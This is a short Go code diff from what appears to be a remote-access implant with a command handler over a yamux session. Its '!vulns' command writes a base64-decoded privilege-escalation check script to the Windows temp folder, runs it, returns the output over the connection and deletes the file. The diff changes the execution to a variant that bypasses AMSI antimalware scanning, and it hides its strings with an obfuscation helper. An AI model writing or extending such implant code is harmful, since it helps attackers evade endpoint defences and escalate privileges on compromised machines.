@@ -81,14 +81,12 @@ func Run(s *yamux.Session, c net.Conn) {
 			if !handled {
 				switch argv[0] {
 				case utils.Bake("§!vulns§"):					
-					// we also run privesc check
 					privescCheck := utils.Bake("§privesccheck§") // static replacement
 					path := utils.Bake(`§\windows\temp\rechteausweitung.ps1§`)
 					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
 					ioutil.WriteFile(path, []byte(decodedScript), 0644)
-					out, _ := shell.ExecPSOut(fmt.Sprintf(utils.Bake("§. %s;Invoke-PrivescCheck -Extended§"), path), false)
+					out, _ := shell.ExecPSOutNoAMSI(fmt.Sprintf(utils.Bake("§. %s;Invoke-PrivescCheck -Extended§"), path))
 					c.Write([]byte(out))
-					//vulns.Check(c)
 					os.Remove(path)
 					prompt(c)					
 				case utils.Bake("§!runasps§"):
